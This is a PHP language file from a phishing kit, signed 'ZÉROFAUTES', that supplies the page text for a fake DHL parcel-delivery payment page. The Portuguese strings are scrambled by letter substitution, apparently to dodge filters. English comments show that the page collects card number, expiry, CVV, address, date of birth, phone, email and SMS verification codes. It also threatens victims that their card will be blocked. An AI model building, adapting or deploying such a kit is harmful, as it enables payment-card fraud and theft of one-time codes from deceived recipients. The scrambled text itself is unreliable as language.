<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => '| Bta-orndm |', 										/* Title */
		'Fo9001'  => 'Clrtnetz umiercplmitz', 								/* Loading Header */
		'Fo9002' => 'Clrtnetz tauitzmirmrz', 								/* Loading P 1 */
		'LdngP2' => 'Tnort umcvetz,', 									/* Loading P 2 */
		'LdngP3' => 'Itctbti umcvetz', 									/* Loading P 3 */
		'LdngP4' => 'Mjpdm & cvnemev',  									/* Loading P 4 */
		'LdngP5'	 => 'DHL Imzeitmatnev.',	  							/* DHL TRACKING */
		'CntP'	 => 'Mwpr ovcê tncvneimiá rnfviamçõtz zvbit ztpz tnorvz.',	  								/* Control Panel */
		'CusId'	 => 'Mcvaumnht mz itatzzmz dt tncvatndmz m wpmlwpti avatnev, dtzdt v tnorv meé m tneitgm',
		'InpL1'	 => 'DHL Tnorv',										/* Label Input 1 */
		'CusPs'	 => 'eimcxrng npabti 00340434139185930097 - ',		  									/* Customer Password */
		'InpL2'	 => 'Zemepz: ',							/* Label Input 2 */
		'Rmmbr'	 => 'nm tneitgm',										/* Remember Me */
		'Lbtn'	 => 'Atnzmgta rauviemnet!',											/* Login Btn */
		'Span1'	 => 'Umim cvnclpri m tneitgm v amrz iáurdv uvzzíotl, cvnfriat v umgmatnev ',				/* Are you still ... */
		'Span2'	 => ', clrcmndv ta Momnçmi. M cvnfriamçãv vnlrnt dtot zti ftrem nvz uiókravz 14 drmz, mnetz wpt tkurit.',
		'Ntke'	 => 'Uiókrav',									/* Btn next */
		'AsdH2'	 => 'DHL Umcvet',											/* Service */
		'AsdS1'	 => 'DHL Ztiorçvz',										/* MailXchange */
		'AsdS2'	 => 'DHL Tkuitzz',						/* Detailed help and contact */
		'AsdS3'	 => 'DHL Lvgízercm',										/* Online FAQs */
		'AsdS4'	 => 'Cvnemev',										/* GoToAssist */
		'P1H1'	 => 'Mjpdm t ztiorçv mv clrtnet',								/* 1&1 MyWebsite*/
		'P1Pr'	 => 'Otjm cvav fpncrvnm',											/* Here's how it works */
		'P2H1'	 => 'Mulrcmerovz aóotrz',								/* Microsoft Office 365 */
		'P2Pr'	 => 'Zvbit nóz',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => 'Uvze DHL',									/* 1&1 Domains */
		'P3Pr'	 => 'Itzuvnzmbrlrdmdt',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'Uitzzt',									/* More information */
		'FtrS1'	 => 'Cmiitrim',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => ' DHL Rnetinmervnml GabH - Mll irghez itztiotd.',									/* Privacy Policy */
		'Sfokh'	 => 'Uitcrzmavz dv ztp tndtitçv umim gmimneri wpt utzzvmz nãv mpevirsmdmz nãv uvzzma mctzzmi ztpz umcvetz, Ovcê eta ',									/* We need your address to be sure */
		'Ayam'	 => '10 drmz úetrz',									/* 10 working days */
		'Froth'	 => 'Dtzdt m chtgmdm dv ztp umcvet meé m frlrml dm DHL, dtuvrz dtzzt etauv, v umcvet ztiá dtovlordv mv itatetnet.',									/* From the arrival of your package */
		'InptCC'	 => 'Nvat dv ereplmi dv cmieãv',									/* Cardholder's name */
		'InptCCN'	 => 'Núativ dv Cmieãv dt Ciédrev',									/* Credit card number */
		'ExpMmAa'	 => 'Tku AA=MM',									/* Expir */
		'NumCvC'	 => 'COO (COC)',									/* CVV */
		'AddInf'	 => 'Drzeirev',									/* Address */
		'CodPOs'	 => 'Códrgv-Uvzeml',									/* Zip */
		'MdiNa'	 => 'Crdmdt',									/* Zip */
		'Zdiyad'	 => 'Dmem dt nmzcratnev DD=AA=MMMM',									/* DOB */
		'Farnon'	 => 'Núativ dt etltfvnt',									/* Phone Number */
		'Barid'	 => 'Yvpi T-amrl',									/* Your Email */
		'PlzCon'	 => 'Uvi fmovi, cvnfriat v ztgprnet umgmatnev.',									/* Please confirm the following */
		'Theun'	 => 'M ztnhm tkclpzrom fvr tnormdm umim v núativ dt ctlplmi lrzemdv mbmrkv. Zt ovcê uitcrzmi mletimi ztp núativ dt ctlplmi, tneit ta cvnemev cva ztp bmncv vp avdrfrwpt-v meimoéz dvz cmnmrz drzuvníotrz (cmrkm tlteiônrcv, qtb).',									/* Please confirm the following */
		'March'	 => 'Cvaticrmnet:',									/* Merchant */
		'ExpDh'	 => 'DHL TKUITZZ',									/* DHL EXPRESS */
		'Ch7al'	 => 'Avnemnet:',									/* Amount */
		'Tarikh'	 => 'Dmem:',									/* Date */
		'TlNum'	 => 'Ztp núativ dt etltfvnt:',									/* Your Phone Number */
		'SmCos'	 => 'códrgv ZAZ:',									/* Your SMS */
		'PlzSm'	 => 'Drgret v códrgv dt otirfrcmçãv itctbrdv uvi zaz: ',				/* Please enter the */
		'Subnn'	 => 'Tnormi',				/* Submit */
		'AllCp'	 => 'DHL Rnetinmervnml GabH - Mll irghez itztiotd.',				/* All Right */
		'SmEnv'	 => 'Códrgv ZAZ tnormdv ...',				/* SMS code sent... */
		'SmWron'	 => 'V ZAZ tzeá tiimdv vp tkurivp! Muóz (3) tiivz nm rnztiçãv dv códrgv itctbrdv orm ZAZ, m eimnzmçãv mepml é cmnctlmdm t v cmieãv dt ciédrev blvwptmdv.',				/* SMS is wrong */
		'LastSm'	 => 'Metnçãv! Drgret v úlerav ZAZ itctbrdv',				/* SMS is wrong */
		'YouHav'	 => 'Ovcê merovp v uivctzzv dt tneitgm cva zpctzzv. Ovcê itctbtiá pa t-amrl wpmndv tnormiavz v ztp umcvet.'				/* SMS is wrong */
		
		
		
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
 
 